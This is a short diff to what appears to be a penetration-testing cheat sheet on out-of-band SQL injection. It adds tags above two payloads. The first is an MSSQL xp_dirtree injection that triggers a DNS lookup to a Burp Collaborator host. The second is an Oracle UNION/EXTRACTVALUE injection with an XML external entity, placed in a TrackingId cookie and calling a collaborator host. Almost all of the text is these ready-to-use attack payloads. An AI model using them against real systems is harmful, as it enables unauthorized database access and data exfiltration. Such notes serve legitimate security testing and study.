@@ -1,10 +1,11 @@
-
 By DNS lookup:
+[[DNS]]
 ```sql
 '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
 ```
 
 Oracle example:
+[[oracle]]
 ```sql
 TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//asdf.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```
